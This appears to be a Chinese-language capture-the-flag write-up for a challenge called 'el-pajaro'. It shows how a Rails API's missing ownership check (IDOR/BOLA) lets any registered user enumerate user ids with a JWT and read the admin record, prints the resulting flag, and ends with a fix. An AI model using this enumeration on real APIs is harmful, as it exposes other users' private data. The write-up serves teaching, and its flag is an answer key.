# el-pajaro

## 题目简述

Rails API 允许任意用户注册并取得 JWT。readUser 只验证 token 对应的用户仍存在，却没有检查请求参数 id 是否等于 token 中的 user_id；因此认证用户可以读取任意账号，管理员邮箱就是 flag。

## 解题过程

先创建随机用户名：

~~~http
POST /user/create
Content-Type: application/json

{"username":"random-user","password":"pass","email":"a@b.c"}
~~~

响应正文是 JWT。把它放入 Authorization 头，枚举较小的用户 id：

~~~http
GET /user/find?id=0
Authorization: <token>
~~~

控制器只执行 User.exists?(auth[:user_id]) 与 User.exists?(id: params[:id])，没有建立二者关系。读取管理员记录后，其 email 字段为：

~~~text
maple{Birds_of_a_f3ath3r_fl0ck_together}
~~~

## 方法总结

认证回答“你是谁”，授权回答“你能访问哪个对象”。只验证 JWT 有效而不校验资源所有权就是 IDOR/BOLA。修复时应由服务端使用 auth[:user_id] 选择普通用户对象，并为管理员查询建立显式角色权限。
